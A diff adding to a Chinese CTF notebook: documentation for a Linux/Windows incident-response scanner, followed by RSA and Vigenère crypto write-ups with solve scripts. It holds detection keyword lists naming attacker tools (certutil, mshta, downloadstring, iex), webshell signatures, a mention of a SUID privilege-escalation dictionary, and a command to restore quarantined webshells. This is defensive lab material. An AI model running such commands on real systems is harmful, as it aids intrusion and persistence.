+> **技巧**：CTF Flag 常见隐藏位置（按出现频率排序）：
+> 1. `/root/.bash_history` — 命令历史中直接 echo flag
+> 2. `/etc/rc.d/rc.local` — 开机启动脚本注释行
+> 3. `/etc/redis.conf` 等服务配置注释行
+> 4. 隐藏目录 `.api/`、`.cache/` 下的 PHP 文件
+> 5. `/etc/profile` — 环境变量
+> 6. PCAP 文件中的 HTTP 响应体
+> 7. 数据库用户表密码字段
+> 8. ELF 后门文件的 strings 输出
+
+### v1.2 新功能：SUID 提权检测 + 智能异常分析
+
+#### SUID 提权检测（模块7增强）
+
+内置 **GTFOBins 风格的 SUID 提权数据库**（35+ 种二进制），检测到可提权 SUID 时自动告警并提供提权命令示例：
+
+| 检测项 | 说明 |
+|---------|------|
+| `SUID_GTFOBINS` 字典 | 35+ 种可被 SUID 利用提权的二进制（find/python/perl/nmap/bash/awk/vim/cp/chmod 等），含提权命令示例 |
+| `DEFAULT_SUID_WHITELIST` 集合 | 30+ 种 CentOS/Ubuntu 系统默认合法 SUID 文件（su/sudo/mount/passwd/pkexec 等）|
+| 三级分类 | 正常（白名单）/ 可提权（GTFOBins 匹配，HIGH）/ 未知（非标准目录，MEDIUM/LOW）|
+
+#### 智能异常分析（模块99，后置分析）
+
+在所有模块采集完数据后，自动对比内置基线数据，明确提醒异常项：
+
+| 分析维度 | 基线对比逻辑 |
+|----------|-------------|
+| 用户与权限 | 服务账户不应有登录shell；shadow 中 `!!`/`*` 是锁定账户(正常)，`$1$` 是MD5(弱)，`$6$` 是SHA-512(正常) |
+| 网络端口 | 内置安全端口表(22/80/443/...)和数据库端口表(3306/6379/...)，区分已知服务/DB暴露/未知端口 |
+| DNS劫持 | /etc/hosts 中不应出现 github.com/google.com 等公共域名映射 |
+| SSH配置 | PermitRootLogin应为no，PasswordAuthentication应禁用，应设置MaxAuthTries |
+| 攻击链推断 | 根据 findings 的 category 字段自动关联：暴力破解→Web渗透→后门植入→持久化→挖矿→Rootkit |
+
+> 设计哲学：**大而美**——宁可冗余采集也不遗漏信息，但通过后置分析自动过滤正常项、突出异常项
+
+### v1.2 Bug 修复记录（实测靶机 192.168.88.130 验证）
+
+| Bug | 原因 | 修复 |
+|-----|------|------|
+| 智能分析误报弱密码哈希 | CentOS shadow 中 `!!`（锁定账户）未在跳过列表中，被当成了"非$格式DES" | 将 `!` 和 `!!` 开头的哈希都加入跳过列表 |
+| 挖矿配置误报 yum 缓存 | `grep -rl 'pool'` 匹配了 `/var/cache/yum/.../primary_db.sqlite` | 排除列表增加 `/var/cache`、`/var/lib`、`/etc/yum` |
+| 隐藏进程误报短命子进程 | ps 快照和 /proc 快照之间产生的临时进程（yum/rpm子进程）被当成隐藏进程 | 额外检查 `/proc/<pid>/comm` 是否存在，只报告实际存活的隐藏PID |
+| bash_history 重复读取 | `/etc/passwd` 中多个用户 home 目录相同时，`for d in $(cut...)` 重复读取同一文件 | `cut -d: -f6 /etc/passwd | sort -u` 去重 home 目录 |
+| bash_history 误报普通vim | `vim\s+` 匹配所有 vim 命令，正常运维也会用 vim | 收紧为 `vim\s+/etc`，只对编辑系统配置文件的vim告警 |
+| SUID 误报 crontab | CentOS 默认 `/usr/bin/crontab` 有 SUID，但不在白名单中 | 将 `crontab` 加入 `DEFAULT_SUID_WHITELIST` |
+
+### v1.1 Bug 修复记录（实测靶机 192.168.88.130 验证）
+
+| Bug | 原因 | 修复 |
+|-----|------|------|
+| 模块15 `_pr()` 报错 `unexpected keyword argument 'lines'` | 10处 `_pr()` 调用传了 `lines=` 参数，但方法定义的参数名是 `max_lines` | 全部改为 `max_lines=` |
+| 模块4 误报 `[crypto]` 内核线程为挖矿进程 | `grep -iE "crypto"` 匹配了内核线程 `[crypto]` | 从挖矿关键词中移除 `crypto`，单独检测时排除 `[xxx]` 格式的内核线程 |
+| 模块17 物理机误报容器逃逸 `CAP_SYS_ADMIN` | 物理机 root 拥有全部 capability，`CapEff` 含 CAP_SYS_ADMIN 是正常的 | 先检查 `/proc/1/cgroup` 判断是否真的在容器中，仅容器环境才检查 CAP_SYS_ADMIN |
+| 模块2 端口误报（不区分回环/对外） | 原代码只看端口是否出现，不区分 `127.0.0.1:3306` 和 `0.0.0.0:3306` | 逐行检查监听地址：`127.0.0.1`/`::1` → LOW，`0.0.0.0`/`[::]` → HIGH |
+| 模块15 Go ELF 检测误报 `[error]` | `find / -type f -exec file` 超时返回 `[error]` 字符串，非空就触发了 HIGH | 过滤掉 `[error]` 开头的输出 |
+| 模块15 挖矿配置误报系统文件 | `grep 'pool'` 匹配了 LVM/grub 等系统配置中的 `pool` 关键词 | 收紧匹配模式（`stratum+tcp`/`xmrig`/`cryptonight` 等），排除 `/etc/grub`、`/etc/lvm` 等系统目录 |
+
+---
+
+## 附录：自动化 Windows 应急响应扫描器（通用工具）
+
+### 设计背景
+
+与 Linux 版 `ir_scanner.py` v1.2 对称，开发了 Windows 版自动化应急响应扫描器。同样通过 SSH（paramiko）远程连接 Windows 靶机，将所有命令替换为 PowerShell 等价命令，架构、辅助方法、报告/JSON/HTML 输出完全一致。
+
+> **设计决策**：Windows 版采用 SSH 而非 RDP (3390)
+> - SSH 适合自动化脚本化，文本解析简单，带宽小
+> - RDP 是图形协议，不适合批量自动化命令执行
+> - SSH 不留 GUI 痕迹，适合取证场景
+
+### 工具信息
+
+| 项目 | 内容 |
+|------|------|
+| 路径 | [IR/auto-ir-scanner/ir_scanner_win.py](IR/auto-ir-scanner/ir_scanner_win.py) |
+| 代码量 | ~1880 行 / 98KB (v1.1) |
+| 模块数 | 18 个扫描模块 + 智能异常分析 + 综合报告 |
+| 输出格式 | 终端彩色输出 + JSON + HTML 报告 |
+| 连接方式 | **WinRM** (pypsrp, NTLM认证, 端口5985) |
+| 依赖 | pypsrp（WinRM 远程连接） |
+| 架构参照 | [ir_scanner.py](IR/auto-ir-scanner/ir_scanner.py) (Linux版 v1.2, 1626行) |
+
+### 18 大扫描模块（Windows 版）
+
+| # | 模块 | 采集内容 | 风险检测 |
+|---|------|----------|----------|
+| 01 | 系统基础信息 | hostname/systeminfo/OS/CPU/内存/磁盘/IP/虚拟机检测 | 虚拟机环境标识 |
+| 02 | 网络连接与端口 | 监听端口/所有TCP连接/UDP/网卡/路由/DNS/hosts/防火墙/ARP | Redis/MongoDB等暴露、hosts劫持、异常外连 |
+| 03 | 用户与账户安全 | 本地用户/WMI用户(含隐藏)/管理员组/SAM注册表/登录事件4624-4625/密码策略 | **隐藏账户($结尾)**、多管理员、暴力破解、新建用户 |
+| 04 | 进程排查 | CPU/内存Top20/进程列表/进程树/tasklist/挖矿/可疑进程/网络连接关联 | 挖矿进程、反弹Shell、临时目录可执行 |
+| 05 | 计划任务 | Get-ScheduledTask/schtasks/运行中任务/就绪任务 | 可疑命令(powershell/certutil/mshta/download) |
+| 06 | 启动项与持久化 | HKLM/HKCU Run+RunOnce/Winlogon/启动文件夹/服务/WMI StartupCommand/IFEO | **Winlogon劫持**、**IFEO Debugger劫持**、可疑自启动 |
+| 07 | 文件系统异常 | 7天/24小时修改文件(Depth限4)/Temp目录/可执行文件/脚本/NTFS ADS/隐藏文件/关键文件签名验证 | 临时目录可执行文件、NTFS ADS数据流 |
+| 08 | 隐藏Flag搜索 | CTF常见位置(flag{}/ctf{}/FLAG{})/全局flag搜索/注册表搜索/Web目录/用户桌面 | flag{}、注册表中flag |
+| 09 | PowerShell历史 | PSReadline历史文件/4104脚本块日志/400经典日志/4688进程创建事件 | 可疑命令(certutil/downloadstring/iex/schtasks/add) |
+| 10 | Web应用日志分析 | IIS/phpStudy/nginx日志搜索/Top URL/可疑请求(攻击特征) | 高频攻击请求IP |
+| 11 | Webshell检测 | PHP/ASP-ASPX/JSP特征grep/一句话木马/近期文件/异常扩展名 | Webshell文件(一句话/eval/assert/base64_decode) |
+| 12 | 数据库配置审计 | MySQL/SQLServer服务/配置文件/Web应用凭据/Redis配置 | Redis未授权、DB凭据泄露 |
+| 13 | RDP与远程安全 | RDP状态/端口/NLA/安全层/防火墙RDP规则/4625日志/外部登录/WinRM | **RDP弱配置**、暴力破解、NLA未启用 |
+| 14 | PCAP流量包分析 | 递归搜索pcap/flag搜索/Webshell特征/HTTP请求 | flag、Webshell流量特征(asenc/eval/rebeyond) |
+| 15 | 恶意软件检测 | 可疑可执行文件/挖矿程序/挖矿配置/矿池网络连接/后门文件名/DLL注入/可疑计划任务 | 挖矿、后门文件、**可疑自启动**、DLL注入 |
+| 16 | Rootkit/驱动检测 | 已加载驱动/驱动签名验证/非系统目录驱动/tasklist vs Get-Process对比/可疑服务 | **未签名驱动**、非系统目录驱动、可疑服务 |
+| 17 | Windows Defender | 服务状态/配置偏好(实时保护/排除项)/威胁历史/威胁列表/隔离区恢复/MpCmdRun | **实时保护禁用**、排除路径、威胁检测 |
+| 18 | 综合风险评估 | 风险评分(0-100)/等级(严重/高危/中危/低危/正常)/发现汇总 | HIGH/MEDIUM/LOW/INFO分级 |
+| 99 | **智能异常分析** | **基于Windows基线自动对比**：用户权限/端口基线/hosts劫持/RDP配置/Defender配置/启动项白名单/**攻击链推断** | 自动发现异常无需人工分析 |
+
+### Windows 应急响应关键排查点（vs Linux 对比）
+
+| 排查方向 | Linux | Windows |
+|----------|-------|---------|
+| 隐藏用户 | /etc/passwd vs /etc/shadow | `net user` 看不到的 `$` 结尾账户，WMI/注册表SAM可见 |
+| 自启动 | rc.local/systemd/crontab | 注册表Run/RunOnce/Winlogon/启动文件夹/服务 |
+| 持久化 | ld.so.preload/crontab | IFEO Debugger劫持/计划任务/恶意服务 |
+| 恶意软件 | ELF/挖矿/minerd | PyInstaller挖矿/Defender隔离区/驱动Rootkit |
+| 日志取证 | /var/log/secure/auth.log | Event Log 4624/4625/4688/PowerShell 4104 |
+| 隐藏进程 | ps vs /proc对比 | tasklist vs Get-Process对比 |
+| 安全软件 | — | Windows Defender状态/排除项/隔离区恢复 |
+| 流量取证 | pcap strings | Select-String + Encoding.ASCII.GetString |
+
+### 用法
+
+```bash
+# 全量扫描 (WinRM, 默认端口 5985)
+py -3 ir_scanner_win.py -H 192.168.234.129 -U Administrator -P 'zgsf@123'
+
+# 同时保存 JSON 和 HTML 报告
+py -3 ir_scanner_win.py -H 10.0.0.5 -U Administrator -P 'Pass' --json result.json --report report.html
+
+# 指定 Web 根目录
+py -3 ir_scanner_win.py -H 10.0.0.5 -U Administrator -P 'Pass' --webroot C:\phpstudy_pro\WWW
+
+# 仅运行指定模块（逗号分隔）
+py -3 ir_scanner_win.py -H 10.0.0.5 -U Administrator -P 'Pass' --modules 1,2,3,6,17
+```
+
+### Windows 应急响应技巧总结
+
+> **技巧**：Windows 应急响应排查优先级：
+> 1. **隐藏账户** → `net user` 看不到的账户，用 `Get-WmiObject Win32_UserAccount` 或注册表 `HKLM\SAM\Domains\Account\Users\Names` 检查 `$` 结尾账户
+> 2. **攻击者IP** → 安全日志 Event ID 4625(失败)和 4624(成功)中提取 Source Network Address
+> 3. **持久化** → 注册表 Run/RunOnce/Winlogon Shell、启动文件夹、计划任务、IFEO Debugger
+> 4. **Webshell** → Defender隔离区 `MpCmdRun.exe -Restore -All` 恢复，识别蚁剑/冰蝎/哥斯拉特征
+> 5. **挖矿程序** → `Get-Process` 检测矿工进程名(kuang/miner/xmrig)，解包 PyInstaller exe 分析矿池域名
+> 6. **Defender** → 检查 `DisableRealtimeMonitoring` 和 `ExclusionPath`，恢复隔离文件
+> 7. **PowerShell历史** → PSReadline历史文件路径 + Event 4104 脚本块日志
+
+> ⚠️ **Windows CTF IR 高频考点**：
+> - **隐藏账户** → `$` 结尾(net user 不可见)，查WMI/注册表
+> - **冰蝎webshell密码** → `rebeyond` (MD5前16位匹配)
+> - **挖矿程序** → PyInstaller打包，用 pyinstxtractor 解包后 uncompyle6 反编译
+> - **Defender隔离区** → `MpCmdRun.exe -Restore -All` 恢复被杀的webshell
+> - **攻击者IP** → 4625日志源IP按频率统计，排除正常管理员
+
+### 智能异常分析（模块99，Windows版）
+
+| 分析维度 | 基线对比逻辑 |
+|----------|-------------|
+| 用户与权限 | 默认用户集(Administrator/Guest/DefaultAccount等)，非默认用户>3个提醒；`$`结尾账户=隐藏账户(HIGH) |
+| 网络端口 | 内置安全端口表(22/80/443/3389/445/...)和数据库端口表，区分已知服务/DB暴露/未知端口 |
+| hosts劫持 | hosts文件不应出现 github.com/google.com/baidu.com 等公共域名映射 |
+| RDP配置 | fDenyTSConnections=0(RDP开启)、NLA未启用、安全层=0 均为弱项 |
+| Defender配置 | DisableRealtimeMonitoring=True(已禁用)、ExclusionPath非空(排除路径) 为异常 |
+| 启动项白名单 | `DEFAULT_AUTORUN_WHITELIST` 对比Run/RunOnce键值，非默认项提醒 |
+| 攻击链推断 | 暴力破解→Web渗透/Webshell→后门植入→持久化→挖矿→Rootkit/注入→安全软件禁用 |
+
+### v1.1 更新日志 (WinRM 后端 + 性能优化)
+
+#### 连接层重构：paramiko SSH → pypsrp WinRM
+
+原 v1.0 使用 paramiko SSH 连接 Windows 靶机, 但实际靶机通常未开启 SSH 服务(22端口), 而 WinRM(5985) 在 Windows Server 上默认开放。
+
+**关键修改：**
+
+| 组件 | v1.0 (paramiko SSH) | v1.1 (pypsrp WinRM) |
+|------|---------------------|----------------------|
+| import | `import paramiko` | `from pypsrp.client import Client` |
+| 连接 | `paramiko.SSHClient().connect()` | `Client(host, auth='ntlm', ssl=False, port=5985)` |
+| 执行命令 | `exec_command(cmd, timeout=)` | `execute_cmd(cmd)` (无 timeout 参数) |
+| 默认端口 | 22 | 5985 |
+| PowerShell | `-Command` + 反引号转义 | **`-EncodedCommand`** (UTF-16LE Base64, 彻底避免引号转义) |
+
+#### 三个核心 Bug 修复
+
+1. **`execute_cmd()` 不接受 `timeout` 参数** — pypsrp 与 paramiko API 不同, 超时在 Client 构造时设置
+2. **CLIXML 噪音过滤** — WinRM 下 PowerShell 进度/警告流序列化为 `#< CLIXML <Objs>...` 格式, 新增 `_strip_clixml()` 正则过滤
+3. **GBK/UTF-8 混合编码** — cmd.exe 原始命令输出 GBK, PowerShell 输出 UTF-8; `ps()` 方法前置 `chcp 65001` + `[Console]::OutputEncoding=UTF8`, `run()` 默认 gbk 解码, `ps()` 用 utf-8 解码
+
+#### 性能优化 (全盘递归搜索加 Depth 限制)
+
+原 v1.0 多处使用 `Get-ChildItem -Path C:\ -Recurse` 全盘递归, 在真实系统上耗时数分钟甚至超时:
+
+| 模块 | 原命令 | 优化后 | 效果 |
+|------|--------|--------|------|
+| 07 | `C:\ -Recurse` (7天/24小时文件) | `-Depth 4` | 200s→60s |
+| 07 | `sfc /verifyonly`（分钟级） | 改为关键文件签名验证 | 秒级 |
+| 08 | `reg query HKLM /s /f flag{` (全注册表) | 限定 `HKLM\SOFTWARE` + `/t REG_SZ` | 10min+→秒级 |
+| 08 | `Users -Recurse` flag搜索 | `-Depth 5` | 大幅加速 |
+| 12 | `C:\ -Recurse` 搜索 my.ini | `-Depth 3` | 大幅加速 |
+| 14 | `C:\ -Recurse` 搜索 pcap | `-Depth 4` | 大幅加速 |
+| 15 | `C:\ -Recurse` 搜索挖矿配置/后门名 | `-Depth 4` | 大幅加速 |
+| 16 | `C:\ -Recurse` 搜索 .sys | `-Depth 4` | 大幅加速 |
+
+#### 实测结果 (Windows Server 2022 靶机)
+
+| 指标 | 数据 |
+|------|------|
+| 靶机 | 192.168.234.129 (Windows Server 2022 Datacenter, VMware) |
+| 扫描耗时 | 248 秒 (~4分钟) |
+| 风险评分 | 100/100 (严重) |
+| 发现总数 | 17 个 (HIGH=6, MEDIUM=11) |
+| JSON 报告 | 1.4 MB |
+| HTML 报告 | 1.4 MB |
+
+**关键发现：**
+- [HIGH] RDP 端口 3389 对外监听
+- [HIGH] 发现可疑反弹Shell/后门进程
+- [HIGH] 计划任务中存在可疑命令
+- [HIGH] 启动项中存在可疑命令 (`systems.bat`)
+- [HIGH] Defender 实时保护已禁用
+- [HIGH] 推断完整攻击链: 暴力破解→后门植入→持久化→安全软件禁用
+- [MEDIUM] IP 192.168.115.131 登录失败 12 次
+- [MEDIUM] 发现可疑后门文件名
+- [MEDIUM] Defender 配置存在安全弱项 (排除路径)
+
+> AI生成
+---
+
+
+---
+
+## Crypto 方向
+
+## 第6题：RSA 基础解密
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | Crypto - RSA |
+| 难度 | 入门 |
+| 日期 | 2026-07-31 |
+| 工具 | gmpy2（大数加速）、pycryptodome（编码转换） |
+
+### 题目描述
+
+"Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm."
+
+直接给出 RSA 的全部参数：p、q、e、c，要求解密还原明文。
+
+### 题目参数
+
+```
+p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483
+q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407
+e = 65537
+c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034
+```
+
+### 解题思路
+
+**1. RSA 算法回顾**
+
+RSA 加解密流程：
+- 公钥：`(n, e)`，其中 `n = p × q`
+- 加密：`c = m^e mod n`
+- 私钥：`d = e⁻¹ mod φ(n)`，其中 `φ(n) = (p-1)(q-1)`
+- 解密：`m = c^d mod n`
+
+**2. 本题特点**
+
+题目直接给出了 p 和 q（无需因式分解 n），因此可以直接计算 φ(n)，再求私钥 d，最后解密。
+
+**3. 库选择与性能对比**
+
+本题使用三个核心库替代纯 Python 内置函数：
+
+| 库 | 用途 | 对比 Python 内置 |
+|----|------|-----------------|
+| `gmpy2` | 模逆元 `invert()`、模幂 `powmod()`、开方 `iroot()`、素性检测 | 快 **6.2x**（500次RSA运算: 0.35s vs 2.18s） |
+| `pycryptodome` | `long_to_bytes()` / `bytes_to_long()` 编码转换 | 比手写 `int.to_bytes()` 更方便，自动处理长度 |
+| `sympy` | `factorint()` 因式分解（Pollard rho + ECM） | 离线可用，适合中小规模 n |
+
+gmpy2 底层是 GMP (GNU Multiple Precision) C 库，大数运算远快于 Python 的纯整数实现。
+
+**4. 解题步骤**
+
+```
+Step 1: n = p × q
+Step 2: φ(n) = (p-1) × (q-1)
+Step 3: d = e⁻¹ mod φ(n)        ← gmpy2.invert(e, phi)
+Step 4: m = c^d mod n            ← gmpy2.powmod(c, d, n)
+Step 5: 验证 m^e mod n == c      ← 确认解密正确
+```
+
+### 解题脚本
+
+> 完整脚本保存为 `rsa_toolkit.py`，封装了 RSA 解密 + 常见攻击模块，可复用。
+
+```python
+#!/usr/bin/env python3
+"""
+CTF RSA 解题通用脚本库 (rsa_toolkit.py)
+封装 RSA 常用操作，优先使用 gmpy2 加速大数运算，
+无 gmpy2 时自动回退到 Python 内置函数。
+
+核心依赖: gmpy2, pycryptodome
+可选依赖: sympy (因式分解)
+安装: pip install gmpy2 pycryptodome sympy
+"""
+
+# ---- 依赖加载（优先 gmpy2，回退内置）----
+try:
+    import gmpy2
+    _HAS_GMPY2 = True
+except ImportError:
+    _HAS_GMPY2 = False
+
+from Crypto.Util.number import long_to_bytes, bytes_to_long
+
+# ---- 基础运算 ----
+
+def modinv(a, m):
+    """模逆元 a^{-1} mod m"""
+    if _HAS_GMPY2:
+        return int(gmpy2.invert(a, m))
+    return pow(a, -1, m)
+
+def powmod(base, exp, mod):
+    """模幂 base^exp mod mod"""
+    if _HAS_GMPY2:
+        return int(gmpy2.powmod(base, exp, mod))
+    return pow(base, exp, mod)
+
+def iroot(n, k):
+    """整数 k 次方根，返回 (root, is_exact)"""
+    if _HAS_GMPY2:
+        r, exact = gmpy2.iroot(n, k)
+        return int(r), bool(exact)
+    # 回退：二分搜索
+    lo, hi = 0, 1 << ((n.bit_length() + k - 1) // k + 1)
+    while lo < hi:
+        mid = (lo + hi) // 2
+        if mid ** k < n:
+            lo = mid + 1
+        else:
+            hi = mid
+    return lo, (lo ** k == n)
+
+# ---- RSA 核心 ----
+
+def rsa_compute_d(p, q, e):
+    """已知 p, q, e 计算私钥 d"""
+    phi = (p - 1) * (q - 1)
+    return modinv(e, phi)
+
+def rsa_decrypt(c, d, n):
+    """RSA 解密: m = c^d mod n"""
+    return powmod(c, d, n)
+
+# ---- 第6题: RSA 基础解密 ----
+
+if __name__ == '__main__':
+    p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483
+    q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407
+    e = 65537
+    c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034
+
+    print(f"gmpy2 加速: {'已启用' if _HAS_GMPY2 else '未安装(回退内置)'}")
+
+    n = p * q
+    d = rsa_compute_d(p, q, e)
+    m = rsa_decrypt(c, d, n)
+
+    # 验证
+    assert powmod(m, e, n) == c, "验证失败!"
+
+    print(f"n   = {n}")
+    print(f"d   = {d}")
+    print(f"m   = {m}")
+    print(f"hex = {hex(m)}")
+    print(f"bytes = {long_to_bytes(m)}")
+    print(f"验证: m^e mod n == c  ✓")
+    print(f"\nSecret message: {m}")
+```
+
+> 此外 `rsa_toolkit.py` 还封装了以下攻击模块，供后续 RSA 变体题复用：
+> - `factorize_n(n)` — 因式分解（sympy 本地 + factordb 在线）
+> - `attack_small_e(c, e, n)` — 小加密指数攻击（直接开方）
+> - `attack_common_modulus(n, e1, c1, e2, c2)` — 共模攻击
+> - `attack_wiener(e, n)` — Wiener 攻击（连分数展开恢复 d）
+
+### 运行结果
+
+```
+gmpy2 加速: 已启用
+n   = 114573516752272714750064227635008832737477859608443481000717283425702025029279291376859256856603741797722497252841363753834114679306784379319341824813349417007577541466886971550474580368413974382926969910999462429631003527365143148445405716553105750338796691010126879918594076915709977585368841428779903869581
+d   = 56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977
+m   = 5577446633554466577768879988
+hex = 0x12058e43d9e0c22559c19774
+bytes = b'\x12\x05\x8eC\xd9\xe0\xc2%Y\xc1\x97t'
+验证: m^e mod n == c  ✓
+
+Secret message: 5577446633554466577768879988
+```
+
+明文转为 bytes 后不构成可读 ASCII 文本，说明本题的 secret message 就是这个整数本身。
+
+Flag: `5577446633554466577768879988`
+
+### 环境依赖
+
+```
+# requirements.txt
+gmpy2>=2.1            # GMP 大数运算加速，比Python内置快6x+
+pycryptodome>=3.20    # long_to_bytes/bytes_to_long, RSA/AES等
+sympy>=1.12           # factorint() 因式分解, isprime() 素性检测
+pwntools>=4.12        # PWN题远程连接
+```
+
+安装方式：
+```bash
+# 在线安装
+pip install -r requirements.txt
+
+# 离线迁移（比赛断网环境）
+# 1. 有网环境下载
+pip download -r requirements.txt -d ./packages
+# 2. 拷贝 packages 目录到离线环境
+pip install --no-index --find-links=./packages -r requirements.txt
+```
+
+### 涉及知识点
+
+| 知识点 | 说明 |
+|--------|------|
+| RSA 加解密原理 | 公钥加密 `c=m^e mod n`，私钥解密 `m=c^d mod n` |
+| 欧拉函数 φ(n) | `φ(n) = (p-1)(q-1)`，用于计算私钥 |
+| 模逆元 | `d = e⁻¹ mod φ(n)`，gmpy2 用 `gmpy2.invert(e, phi)` |
+| 模幂运算 | gmpy2.powmod 比内置 pow 快 6x+ |
+| gmpy2 vs 内置 | gmpy2 底层 GMP C 库，大数运算远快于 Python 纯整数实现 |
+| long_to_bytes | pycryptodome 提供，比手写 `int.to_bytes()` 更方便 |
+| 明文编码 | RSA 明文可为整数，不一定能转为可读 bytes |
+| e=65537 | RSA 最常用的公钥指数，费马数 F4 |
+
+### 同类变体与扩展
+
+- 若只给 n 和 e（不给 p、q），需先因式分解 n：小 n 用 sympy `factorint()` 或 `factordb.com`，大 n 用 yafu/msieve/GNFS
+- 若 e=1，则 c=m，直接提交 c 即可
+- 若 e 极小（如 e=3）且 m^3 < n，可直接对 c 开三次方：`gmpy2.iroot(c, 3)`
+- 若多组相同 n 不同 e（共模攻击），用扩展欧几里得算法求 `s1*e1 + s2*e2 = 1`，再 `m = c1^s1 * c2^s2 mod n`
+- Wiener 攻击：当 d 很小时（d < n^0.25），可用连分数展开 e/n 恢复 d
+- 低加密指数广播攻击：同一明文用多个不同 n 加密且 e 相同，用中国剩余定理（CRT）合并后开 e 次方
+- 离线迁移：`pip download -r requirements.txt -d ./packages` 提前下载，断网环境用 `--find-links` 安装
+
+## 第14题：[BJDCTF 2nd] 燕言燕语 — Hex 解码 + 维吉尼亚密码
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | Crypto - 编码转换 + 维吉尼亚密码 |
+| 难度 | 入门 |
+| 日期 | 2026-08-01 |
+| 来源 | BJDCTF 2nd |
+| 脚本 | [solve.py](Crypto/14-bjdctf-yanzi/solve.py) |
+
+### 题目描述
+
+> 小燕子，穿花衣，年年春天来这里，我问燕子你为啥来，燕子说: 79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20
+
+题目给出一段十六进制字符串，结合"燕子"主题，需要逐步解码。
+
+### 解题思路
+
+**1. Hex 解码**
+
+题目字符串为纯十六进制（0-9, A-F），直接转换为 ASCII：
+
+```
+79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20
+→ yanzi ZJQ{xilzv_iqssuhoc_suzjg}
+```
+
+解码后分为两部分：
+- `yanzi`（燕子拼音）— 密钥提示
+- `ZJQ{xilzv_iqssuhoc_suzjg}` — 密文
+
+**2. 密码类型识别**
+
+> **技巧** 看到密文格式 `ZJQ{...}` 而比赛是 BJDCTF，猜测明文应为 `BJD{...}`。对比各字母偏移量：Z→B(24), J→J(0), Q→D(15) — 偏移量不一致，排除凯撒密码。偏移量随位置变化，指向**维吉尼亚密码**。
+
+分析 `Z→B` 的偏移：`(25 - 24) % 26 = 1`，而密钥第一个字母 `y` 的值也是 24（`ord('y')-ord('a')=24`），符合维吉尼亚加密公式 `cipher = (plain + key) % 26`。
+
+**3. 维吉尼亚解密**
+
+```
+解密公式：plain[i] = (cipher[i] - key[i]) % 26
+```
+
+密钥 `yanzi` 循环使用，跳过非字母字符（`{`、`_`、`}`），仅对字母位置推进密钥索引。
+
+```
+密文: Z  J  Q  {  x  i  l  z  v  _  i  q  s  s  u  h  o  c  _  s  u  z  j  g  }
+密钥: y  a  n  z  i  y  a  n  z  i  y  a  n  z  i  y  a  n  z  i  y  a  n
+明文: b  j  d  {  y  a  n  z  i  _  j  i  u  s  h  i  g  e  _  s  h  a  b  i  }
+```
+
+### 解题脚本
+
+```python
+hex_str = '79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20'
+
+# Step 1: Hex 解码
+decoded = bytes.fromhex(hex_str).decode('ascii')
+# => 'yanzi ZJQ{xilzv_iqssuhoc_suzjg}'
+
+key = 'yanzi'
+cipher = decoded.strip().split(' ', 1)[1]  # 取空格后的密文部分
+
+# Step 2: 维吉尼亚解密
+def vigenere_decrypt(ciphertext, key):
+    result = []
+    ki = 0
+    for ch in ciphertext:
+        if ch.isalpha():
+            c = ord(ch.lower()) - ord('a')
+            k = ord(key[ki % len(key)].lower()) - ord('a')
+            p = (c - k) % 26
+            result.append(chr(p + ord('a')))
+            ki += 1
+        else:
+            result.append(ch)
+    return ''.join(result)
+
+plaintext = vigenere_decrypt(cipher, key)
+print(f'Flag: {plaintext}')
+```
+
+### 运行结果
+
+```
+[1] Hex 解码: 'yanzi ZJQ{xilzv_iqssuhoc_suzjg} '
+    密钥: yanzi
+    密文: ZJQ{xilzv_iqssuhoc_suzjg}
+[2] 维吉尼亚解密: bjd{yanzi_jiushige_shabi}
+[3] 验证加密: zjq{xilzv_iqssuhoc_suzjg}
+    匹配: True
+
+Flag: bjd{yanzi_jiushige_shabi}
+```
+
+Flag: `bjd{yanzi_jiushige_shabi}`
+
+### 涉及知识点
+
+| 知识点 | 说明 |
+|--------|------|
+| Hex 编码 | 每个字符用两位十六进制表示，`bytes.fromhex()` 一键解码 |
+| 维吉尼亚密码 | 多表替换密码，密钥循环使用，`cipher = (plain + key) % 26` |
+| 凯撒 vs 维吉尼亚 | 凯撒是固定偏移（单表），维吉尼亚是随位置变化的偏移（多表） |
+| 密钥提示识别 | 题目文本中的关键词（如"yanzi"）可能就是密钥 |
+| flag 格式识别 | `ZJQ{...}` → `BJD{...}` 的偏移差异用于判断密码类型 |
+| 非字母跳过 | 维吉尼亚解密时 `{`、`_`、`}` 等非字母字符不消耗密钥索引 |
+
+### 同类变体与扩展
+
+- 若密钥未直接给出，可用[维吉尼亚破解工具](https://www.guballa.de/vigenere-solver)或 Kasiski 测试法 + 字频分析自动破解
+- 偏移量不固定也可能是指定位置的凯撒变体，需注意区分
+- Hex 可能替换为 Base32/Base64/URL 编码，解题第一步总是识别编码方式
+- 若解出后明文不可读，检查是否有第二层加密（如先 Hex 再 Base64 再维吉尼亚的链式编码）
+- 常见 CTF 编码识别：纯 0-9A-F → Hex；末尾 `=` → Base64；纯 A-Z2-7 → Base32；`%` 开头 → URL 编码
+
+---
+
+## 第15题：老文盲了 — 生僻字拼音密码
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | Crypto - 编码/文字密码 |
+| 来源 | BJDCTF 2nd |
+| 难度 | 入门 |
+| 日期 | 2026-08-01 |
+
+### 题目内容
+
+```
